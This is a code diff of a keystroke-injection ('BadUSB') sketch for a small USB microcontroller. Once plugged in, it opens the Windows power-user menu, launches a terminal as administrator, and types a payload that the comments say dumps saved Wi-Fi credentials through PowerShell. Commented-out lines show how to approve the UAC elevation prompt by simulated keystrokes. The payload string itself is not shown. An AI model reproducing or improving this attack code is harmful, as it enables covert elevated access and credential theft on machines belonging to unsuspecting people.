@@ -15,14 +15,16 @@ void setup() {
     // --- THE HID INJECTION STARTS HERE ---
     keyboard.delay(6000); // Wait 6 seconds to allow the OS to recognize the device and install drivers if needed
     keyboard.sendKeyStroke(KEY_X, KEY_MOD_GUI); // Win+X (KEY_MOD_GUI = Windows/Command key)
-    keyboard.delay(800); // Wait 0.8 seconds for the run dialog to open
-    keyboard.println("a"); // Open a RickRoll url in the run dialog
-    keyboard.delay(800); // Wait 0.8 seconds for the browser to open
-    keyboard.sendKeyStroke(KEY_LEFT); // Move to beginning of line
-    keyboard.delay(300); // Wait 0.3 seconds for the browser to open
-    keyboard.sendKeyStroke(KEY_ENTER); // Execute command
-    keyboard.delay(2000); // Wait 2 seconds for the browser to open
-    keyboard.println(runCmdPld); // dump wifi creds in PowerShell terminal example
+    keyboard.delay(1200); // Wait 1.2 seconds for the run dialog to open
+    keyboard.println("i"); // Open a terminal window
+    // comment the line above & uncomment the following lines to run terminal as admin
+    keyboard.println("a"); // Open a terminal windows as administrator
+    // keyboard.delay(1200); // Wait 1.2 seconds for the terminal to open
+    // keyboard.sendKeyStroke(KEY_LEFT); // Select 'Yes' on UAC prompt
+    // keyboard.delay(800); // Wait 800 milliseconds for the UAC prompt to appear
+    // keyboard.sendKeyStroke(KEY_ENTER); // Enter to confirm UAC and open terminal
+    keyboard.delay(5000); // Wait 5 seconds for the terminal to open
+    keyboard.println(runCmdPld); // type payload to dump wifi creds in PowerShell terminal example
     // --- THE HID INJECTION ENDS HERE ---
     
     digitalWrite(redLED, LOW); // Turn off the RED LED after executing payload
